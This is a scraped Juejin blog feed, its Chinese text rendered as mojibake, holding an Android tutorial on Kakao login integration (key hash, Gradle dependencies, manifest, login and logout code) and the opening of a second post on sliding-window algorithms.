(max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h4 data-id="heading-0">å‰è¨€å¯¼è¯»</h4>
<p>å„ä½åŒå­¦å¤§å®¶å¥½ï¼Œæœ‰æ®µæ—¶é—´æ²¡æœ‰è·Ÿå¤§å®¶è§é¢äº†ï¼Œæœ€è¿‘å› ä¸ºæ¢äº†æ–°å·¥ä½œï¼Œæ‰€ä»¥ä¹Ÿæ˜¯é‡åˆ°ä¸€äº›æ–°çš„éœ€æ±‚å’Œä¸šåŠ¡ï¼Œæ­£å¥½éœ€è¦æ¥ä¸€ä¸ªéŸ©å›½çš„ç¬¬ä¸‰æ–¹ç™»å½•ï¼Œkakaoç™»å½•ï¼Œåˆšå¥½ä»Šå¤©è°ƒè¯•OKäº†æ‰€ä»¥èƒ½å°±æƒ³ç€è·Ÿå¤§å®¶åˆ†äº«ä¸€ä¸‹ï¼Œé‚£ä¹ˆåºŸè¯ä¸å¤šè¯´ï¼Œæˆ‘ä»¬æ­£å¼å¼€å§‹</p>
<h4 data-id="heading-1">å®˜æ–¹æ–‡æ¡£</h4>
<h4 data-id="heading-2">å‚æ•°å’Œä¾èµ–æ–‡æ¡£</h4>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fdevelopers.kakao.com%2Fdocs%2Flatest%2Fen%2Fandroid%2Fgetting-started%23install" target="_blank" title="https://developers.kakao.com/docs/latest/en/android/getting-started#install" ref="nofollow noopener noreferrer">developers.kakao.com/docs/latestâ€¦</a></p>
<h4 data-id="heading-3">å…·ä½“æ¥å…¥æŒ‡å—</h4>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fdevelopers.kakao.com%2Fdocs%2Flatest%2Fen%2Fkakaologin%2Fandroid%23logout" target="_blank" title="https://developers.kakao.com/docs/latest/en/kakaologin/android#logout" ref="nofollow noopener noreferrer">developers.kakao.com/docs/latestâ€¦</a></p>
<h4 data-id="heading-4">å…·ä½“å®ç°</h4>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a1d4fab3c8464ca59f11bf0e2a9526a8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgeHE5NTI3:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767607387&amp;x-signature=oq6RIOdNYz5nmPN9mYP4pAmFU4Q%3D" alt="image.png" loading="lazy"/>
æˆ‘ä»¬çœ‹åˆ°è¿™å¼ å›¾ æˆ‘ä»¬åªéœ€è¦ç™»å½•çš„éƒ¨åˆ†ï¼Œæˆ‘ä»¬åœ¨ä¾èµ–äº†æˆ‘ä»¬çš„è°ƒç”¨kakaoç™»å½•åæ‹¿åˆ°æˆ‘ä»¬çš„token.accessToken  ç„¶åå»æœåŠ¡ç«¯è¿›è¡Œæ ¡éªŒå³å¯</p>
<h4 data-id="heading-5">å‡†å¤‡å·¥ä½œ</h4>
<p>è·å–æ•£åˆ— å¯¹æ²¡æœ‰é”™è¿™ä¸ªkakaoç™»å½•å’Œfacebook ä¸€æ ·éœ€è¦å¡«æˆ‘ä»¬çš„æ•£åˆ— å…¶å®å°±æ˜¯æˆ‘ä»¬çš„ç­¾åjksçš„sha1 base 64ä¹‹åçš„äº§ç‰©
ä½¿ç”¨å‘½ä»¤è·å–</p>
<pre><code class="hljs language-bash" lang="bash">keytool -exportcert -<span class="hljs-built_in">alias</span> &lt;RELEASE_KEY_ALIAS&gt; -keystore &lt;RELEASE_KEY_PATH&gt; | openssl sha1 -binary | openssl <span class="hljs-built_in">base64</span>
</code></pre>
<p>æˆ–è€…ä¹Ÿå¯ä»¥ä½¿ç”¨ ä»£ç è·å–</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-keyword">var</span> keyHash = Utility.getKeyHash(context)
Log.e(TAG, <span class="hljs-string">"keyHash init: "</span>+keyHash)
</code></pre>
<h4 data-id="heading-6">æˆ‘ä»¬å¯ä»¥åˆ°ä»£ç åº•å±‚å…¶å®ä¹Ÿæ˜¯è·å–äº†sha1 ç„¶åbase 64çš„</h4>
<pre><code class="hljs language-kotlin" lang="kotlin">    <span class="hljs-meta">@TargetApi(Build.VERSION_CODES.P)</span>
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">getKeyHash</span><span class="hljs-params">(context: <span class="hljs-type">Context</span>)</span></span>: String {
        <span class="hljs-keyword">return</span> getKeyHashDeprecated(context)
    }

    <span class="hljs-meta">@Suppress(<span class="hljs-string">"DEPRECATION"</span>)</span>
    <span class="hljs-meta">@SuppressLint(<span class="hljs-string">"PackageManagerGetSignatures"</span>)</span>
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">getKeyHashDeprecated</span><span class="hljs-params">(context: <span class="hljs-type">Context</span>)</span></span>: String {
        <span class="hljs-keyword">val</span> packageInfo = context.packageManager
            .getPackageInfo(context.packageName, PackageManager.GET_SIGNATURES)
        <span class="hljs-keyword">for</span> (signature <span class="hljs-keyword">in</span> packageInfo.signatures ?: emptyArray()) {
            <span class="hljs-keyword">val</span> md = MessageDigest.getInstance(<span class="hljs-string">"SHA"</span>)
            md.update(signature.toByteArray())
            <span class="hljs-keyword">return</span> Base64.encodeToString(md.digest(), Base64.NO_WRAP)
        }
        <span class="hljs-keyword">throw</span> IllegalStateException()
    }
</code></pre>
<h4 data-id="heading-7">ç™»å½•éœ€è¦çš„ä¾èµ–</h4>
<p>åœ¨æˆ‘ä»¬çš„library æˆ–è€…appå±‚çš„build.grale æ·»åŠ ä¾èµ–</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-comment">// Kakao SDK ä¾èµ–</span>
implementation <span class="hljs-string">"com.kakao.sdk:v2-all:latest.release"</span>
implementation <span class="hljs-string">"com.kakao.sdk:v2-user:latest.release"</span>
implementation <span class="hljs-string">"com.kakao.sdk:v2-share:latest.release"</span>
implementation <span class="hljs-string">"com.kakao.sdk:v2-talk:latest.release"</span>
implementation <span class="hljs-string">"com.kakao.sdk:v2-friend:latest.release"</span>
implementation <span class="hljs-string">"com.kakao.sdk:v2-navi:latest.release"</span>
implementation <span class="hljs-string">"com.kakao.sdk:v2-cert:latest.release"</span>
</code></pre>
<h4 data-id="heading-8">æŒ‡å®šjdkç‰ˆæœ¬</h4>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/786ad07b7af847ff8e9596560cd49f42~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgeHE5NTI3:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767607387&amp;x-signature=R2%2BIGsddqtdNY03qesVsUSpG%2FhY%3D" alt="image.png" loading="lazy"/></p>
<h4 data-id="heading-9">åœ¨build.gradleé‡Œé¢æ·»åŠ å¦‚ä¸‹é…ç½®</h4>
<pre><code class="hljs language-ini" lang="ini">compileOptions {
    sourceCompatibility JavaVersion.VERSION_11
    targetCompatibility JavaVersion.VERSION_11
    <span class="hljs-attr">coreLibraryDesugaringEnabled</span> = <span class="hljs-literal">true</span>
}
</code></pre>
<p>ç„¶ååœ¨æˆ‘ä»¬çš„æœ€å¤–å±‚çš„ build.gradle æ·»åŠ kotlinçš„æ”¯æŒ</p>
<pre><code class="hljs language-bash" lang="bash">ext.kotlin_version = <span class="hljs-string">"2.0.0"</span>
classpath <span class="hljs-string">"org.jetbrains.kotlin:kotlin-gradle-plugin:<span class="hljs-variable">$kotlin_version</span>"</span>
</code></pre>
<h4 data-id="heading-10">æ¸…å•æ–‡ä»¶é…ç½®</h4>
<p>kakao${YOUR_NATIVE_APP_KEY} è¿™é‡Œæ˜¯å‰é¢kakao æ‹¼æ¥ä½ ç”³è¯·çš„å‚æ•°çš„åº”ç”¨çš„key</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">activity</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">"com.kakao.sdk.auth.AuthCodeHandlerActivity"</span>
    <span class="hljs-attr">android:exported</span>=<span class="hljs-string">"true"</span>&gt;</span>

    <span class="hljs-tag">&lt;<span class="hljs-name">intent-filter</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">"android.intent.action.VIEW"</span> /&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">category</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">"android.intent.category.DEFAULT"</span> /&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">category</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">"android.intent.category.BROWSABLE"</span> /&gt;</span>

        <span class="hljs-comment">&lt;!-- Redirect URI: "kakao${YOUR_NATIVE_APP_KEY}://oauth" --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">data</span> <span class="hljs-attr">android:scheme</span>=<span class="hljs-string">"kakao${YOUR_NATIVE_APP_KEY}"</span> <span class="hljs-attr">android:host</span>=<span class="hljs-string">"oauth"</span> /&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">intent-filter</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">activity</span>&gt;</span>
</code></pre>
<h4 data-id="heading-11">å…·ä½“ä»£ç å®ç°</h4>
<h4 data-id="heading-12">åˆå§‹åŒ–kakaoç™»å½•</h4>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">init</span><span class="hljs-params">(context: <span class="hljs-type">Context</span>)</span></span> {
    <span class="hljs-comment">//è¿™é‡Œxxxxxxxxxxxxxxx è¦æ¢æˆçœŸå®çš„id</span>
    KakaoSdk.<span class="hljs-keyword">init</span>(context, <span class="hljs-string">"xxxxxxxxxxxxxxx);
    var keyHash = Utility.getKeyHash(context)
    Log.e(TAG, "</span>keyHash <span class="hljs-keyword">init</span>: <span class="hljs-string">"+keyHash)

}
</span></code></pre>
<h4 data-id="heading-13">éœ€è¦åœ¨ Application çš„onCreate é‡Œé¢è°ƒç”¨</h4>
<pre><code class="hljs language-scala" lang="scala">public <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">GameApplication</span>  <span class="hljs-keyword">extends</span> <span class="hljs-title">Application</span> </span>{
    <span class="hljs-keyword">private</span> static <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-type">TAG</span> = <span class="hljs-string">"GameApplication"</span>;

    <span class="hljs-meta">@Override</span>
    public void onCreate() {
        <span class="hljs-keyword">super</span>.onCreate();
        <span class="hljs-type">Log</span>.e(<span class="hljs-type">TAG</span>, <span class="hljs-string">"onCreate: "</span> );
        <span class="hljs-type">MultiDex</span>.install(<span class="hljs-keyword">this</span>);
        <span class="hljs-type">KakaoKtInit</span>.<span class="hljs-type">Companion</span>.getInstance().init(<span class="hljs-keyword">this</span>);
     
     }
 }
</code></pre>
<h4 data-id="heading-14">kakaoå‘èµ·æˆæƒç™»å½•</h4>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-function"><span class="hljs-keyword">fun</span>  <span class="hljs-title">login</span><span class="hljs-params">(activity: <span class="hljs-type">Activity</span>,dialog: <span class="hljs-type">Dialog</span>)</span></span>{
    UserApiClient.instance.loginWithKakao(activity, uiMode= LoginUiMode.AUTO) { token, error -&gt;
        <span class="hljs-keyword">if</span> (error != <span class="hljs-literal">null</span>) {
            Log.e(TAG, <span class="hljs-string">"Login failed."</span>, error)
        } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (token != <span class="hljs-literal">null</span>) {
            Log.i(TAG, <span class="hljs-string">"Login succeeded. <span class="hljs-subst">${token.accessToken}</span>"</span>)
          
        }
    }
}
</code></pre>
<h4 data-id="heading-15">è°ƒèµ·æ•ˆæœå›¾</h4>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1e884c9c60ab4001aa38ff6b46d3b25f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgeHE5NTI3:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767607387&amp;x-signature=27l7QvLZLxhsoHtufukrQZ6JUiQ%3D" alt="image.png" loading="lazy"/></p>
<h4 data-id="heading-16">æ‹¿åˆ°å›è°ƒçš„ accessToken</h4>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/edaa7026e51144be8c8aa6f653ede4b0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgeHE5NTI3:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767607387&amp;x-signature=Sf7SzjG7n74QsfzqXTs4TMS70eg%3D" alt="image.png" loading="lazy"/></p>
<p>æˆ‘ä»¬æ‹¿åˆ°accessToken ç„¶åå»è¯·æ±‚æˆ‘ä»¬æœåŠ¡ç«¯è¿›è¡Œç™»å½•éªŒè¯å³å¯ã€‚</p>
<h4 data-id="heading-17">kakaoæ³¨é”€</h4>
<pre><code class="hljs language-kotlin" lang="kotlin">
<span class="hljs-comment">/***
 * æ³¨é”€ç™»å½•
 *
 */</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span>  <span class="hljs-title">loginOut</span><span class="hljs-params">(activity: <span class="hljs-type">Activity</span>)</span></span>{
    UserApiClient.instance.logout { error -&gt;
        <span class="hljs-keyword">if</span> (error != <span class="hljs-literal">null</span>) {
            Log.e(TAG, <span class="hljs-string">"Logout fail. Tokens are revoked from SDK"</span>, error)
        }
        <span class="hljs-keyword">else</span> {
            Log.i(TAG, <span class="hljs-string">"Logout success. Tokens are revoked from SDK"</span>)
        }
    }
}
</code></pre>
<h4 data-id="heading-18">æœ€åæ€»ç»“ï¼š</h4>
<p>æ•´ä¸ªçš„è¿™ä¸ªkakaoç™»å½•è¿˜ç®—æ¯”è¾ƒç®€å•çš„ï¼Œæˆ‘ä»¬è¦æ³¨æ„çš„å‡ ä¸ªç‚¹ ç¬¬ä¸€ä¸ªå°±æ˜¯åˆå§‹åŒ–çš„ä½ç½®è¦å¯¹ ï¼Œç¬¬äºŒä¸ªå°±æ˜¯æˆ‘ä»¬çš„æ•£åˆ—è¦é…ç½®å¯¹ ä¸ç„¶ä¼šæŠ¥å‡ºç­¾åå’Œçº¿ä¸Šæ•£åˆ—å¯¹ä¸ä¸Šæˆ–è€…æœªé…ç½®éƒ½ä¼šå¯¼è‡´æˆæƒå¤±è´¥ï¼Œæ•´ä½“æ¥è¯´æ¯”naverç™»å½•è¦ç®€å•å¾ˆå¤šï¼Œkakaoæ•´ä¸ªåŠŸèƒ½æ˜¯éå¸¸å¼ºå¤§ï¼Œä¹Ÿæ˜¯éŸ©å›½çš„å›½ååŠappåº”ç”¨ï¼Œæœ‰å…´è¶£çš„åŒå­¦å¯ä»¥æŸ¥é˜…å®˜æ–¹æ–‡æ¡£å»æŸ¥çœ‹æ›´å¤šè‡ªå·±éœ€è¦çš„åŠŸèƒ½</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[æ»‘åŠ¨çª—å£è¯¦è§£ï¼šåŸç†+åˆ†ç±»+åœºæ™¯+æ¨¡æ¿+ä¾‹é¢˜ï¼ˆè§†é¢‘è´¼æ¸…æ™°ï¼‰]]></title>    <link>https://juejin.cn/post/7589159665855692819</link>    <guid>https://juejin.cn/post/7589159665855692819</guid>    <pubDate>2025-12-29T10:28:00.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589159665855692819" data-draft-id="7589126217250357289" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="æ»‘åŠ¨çª—å£è¯¦è§£ï¼šåŸç†+åˆ†ç±»+åœºæ™¯+æ¨¡æ¿+ä¾‹é¢˜ï¼ˆè§†é¢‘è´¼æ¸…æ™°ï¼‰"/> <meta itemprop="keywords" content="JavaScript"/> <meta itemprop="datePublished" content="2025-12-29T10:28:00.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="é¢œé…±"/> <meta itemprop="url" content="https://juejin.cn/user/905653309941495"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            æ»‘åŠ¨çª—å£è¯¦è§£ï¼šåŸç†+åˆ†ç±»+åœºæ™¯+æ¨¡æ¿+ä¾‹é¢˜ï¼ˆè§†é¢‘è´¼æ¸…æ™°ï¼‰
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/905653309941495/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    é¢œé…±
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-29T10:28:00.000Z" title="Mon Dec 29 2025 10:28:00 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»12åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">æ»‘åŠ¨çª—å£è¯¦è§£ï¼šåŸç†+åˆ†ç±»+åœºæ™¯+æ¨¡æ¿+ä¾‹é¢˜</h2>
<blockquote>
<p>ğŸ“º <strong>æ¨èè§†é¢‘</strong>ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fb23.tv%2FrU4vRca" target="_blank" title="https://b23.tv/rU4vRca" ref="nofollow noopener noreferrer">æ»‘åŠ¨çª—å£ç®—æ³•è¯¦è§£</a> - è§†é¢‘è§£é‡Šéå¸¸æ¸…æ™°ï¼Œå»ºè®®å…ˆçœ‹è§†é¢‘å†é˜…è¯»æœ¬æ–‡ï¼</p>
</blockquote>
<p>åœ¨ç®—æ³•é¢è¯•ä¸­ï¼Œå­ä¸²ã€å­æ•°ç»„ç›¸å…³çš„é—®é¢˜é¢‘ç¹å‡ºç°ï¼Œæš´åŠ›æšä¸¾å¾€å¾€å›  O(nÂ²) æ—¶é—´å¤æ‚åº¦è¶…æ—¶ã€‚è€Œæ»‘åŠ¨çª—å£ç®—æ³•ï¼Œå‡­å€Ÿå…¶ O(n) çš„é«˜æ•ˆæ€§èƒ½ï¼Œæˆä¸ºè§£å†³è¿™ç±»é—®é¢˜çš„"ç¥å…µåˆ©å™¨"ã€‚æœ¬æ–‡å°†ä»åŸç†æœ¬è´¨å‡ºå‘ï¼Œæ¢³ç†æ»‘åŠ¨çª—å£çš„åˆ†ç±»ã€é€‚ç”¨åœºæ™¯ï¼Œæç‚¼é€šç”¨æ¨¡æ¿ï¼Œå¹¶ç»“åˆç»å…¸ä¾‹é¢˜å®æˆ˜æ‹†è§£ï¼Œå¸®ä½ å½»åº•æŒæ¡è¿™ä¸€æ ¸å¿ƒç®—æ³•ã€‚</p>
<h2 data-id="heading-1">ä¸€ã€æ»‘åŠ¨çª—å£æ ¸å¿ƒåŸç†ï¼šç”¨å•è°ƒæ€§å‹ç¼©éå†ç»´åº¦</h2>
<p>æ»‘åŠ¨çª—å£çš„æœ¬è´¨ï¼Œæ˜¯<strong>åˆ©ç”¨åŒºé—´çš„å•è°ƒæ€§ï¼Œå°†åŸæœ¬éœ€è¦åµŒå¥—éå†ï¼ˆO(nÂ²)ï¼‰çš„è¿ç»­åŒºé—´é—®é¢˜ï¼Œè½¬åŒ–ä¸ºå•è½®åŒæŒ‡é’ˆéå†ï¼ˆO(n)ï¼‰</strong>ã€‚å…¶æ ¸å¿ƒé€»è¾‘åŸºäºå¯¹â€œçª—å£çŠ¶æ€â€çš„ç²¾å‡†æŠŠæ§ï¼Œé€šè¿‡ä¸¤ä¸ªæŒ‡é’ˆï¼ˆleft å·¦è¾¹ç•Œã€right å³è¾¹ç•Œï¼‰çš„ååŒç§»åŠ¨ï¼Œè·³è¿‡æ— æ•ˆåŒºé—´ï¼ˆå‰ªæï¼‰ï¼Œå®ç°é«˜æ•ˆæšä¸¾ã€‚</p>
<h3 data-id="heading-2">1.1 å…ˆææ‡‚ï¼šæš´åŠ›æšä¸¾çš„ç—›ç‚¹</h3>
<p>ä»¥â€œæ— é‡å¤å­—ç¬¦çš„æœ€é•¿å­ä¸²â€ä¸ºä¾‹ï¼Œæš´åŠ›æ€è·¯æ˜¯æšä¸¾æ‰€æœ‰å­ä¸²çš„èµ·ç‚¹ i å’Œç»ˆç‚¹ jï¼ˆiâ‰¤jï¼‰ï¼Œæ£€æŸ¥å­ä¸² s[i..j] æ˜¯å¦æ— é‡å¤ï¼Œæœ€ç»ˆè®°å½•æœ€é•¿é•¿åº¦ã€‚è¿™ç§æ–¹å¼éœ€è¦éå†æ‰€æœ‰ iã€j ç»„åˆï¼Œæ—¶é—´å¤æ‚åº¦ O(nÂ²)ï¼Œä¸”å­˜åœ¨å¤§é‡æ— æ•ˆè®¡ç®—ï¼šæ¯”å¦‚å½“ s[0..3] å­˜åœ¨é‡å¤æ—¶ï¼Œs[0..4]ã€s[0..5] ç­‰åŒ…å«è¯¥åŒºé—´çš„å­ä¸²å¿…ç„¶ä¹Ÿé‡å¤ï¼Œæ— éœ€å†æ£€æŸ¥ã€‚</p>
<h3 data-id="heading-3">1.2 æ»‘åŠ¨çª—å£çš„æ ¸å¿ƒæ´å¯Ÿï¼šåŒºé—´å•è°ƒæ€§</h3>
<p>æ»‘åŠ¨çª—å£èƒ½ä¼˜åŒ–çš„å…³é”®ï¼Œæ˜¯æŠ“ä½äº†ã€Œçª—å£çŠ¶æ€çš„å•è°ƒæ€§ã€â€”â€” çª—å£çš„çŠ¶æ€ï¼ˆå¦‚æ˜¯å¦å«é‡å¤ã€å’Œ/ç§¯æ˜¯å¦æ»¡è¶³æ¡ä»¶ï¼‰ä¼šéšçª—å£çš„æ‰©å±•/ç¼©å°å‘ˆç°å•å‘å˜åŒ–ï¼Œå…·ä½“å¯æ€»ç»“ä¸ºä¸¤æ¡æ ¸å¿ƒè§„å¾‹ï¼š</p>
<ul>
<li>
<p><strong>è§„å¾‹1ï¼ˆåçŠ¶æ€çš„åŒ…å«æ€§ï¼‰</strong>ï¼šè‹¥çª—å£ [left, right] å¤„äºâ€œåçŠ¶æ€â€ï¼ˆå¦‚å«é‡å¤å­—ç¬¦ã€å’Œâ‰¥targetã€ç§¯â‰¥Kï¼‰ï¼Œåˆ™æ‰€æœ‰åŒ…å«è¯¥çª—å£çš„æ›´å¤§çª—å£ [left, right+1]ã€[left, right+2]... å¿…ç„¶ä¹Ÿæ˜¯â€œåçŠ¶æ€â€ã€‚æ­¤æ—¶æ— éœ€ç»§ç»­æ‰©å±• rightï¼Œåº”ç§»åŠ¨ left ç¼©å°çª—å£ï¼Œè·³è¿‡æ— æ•ˆåŒºé—´ã€‚</p>
</li>
<li>
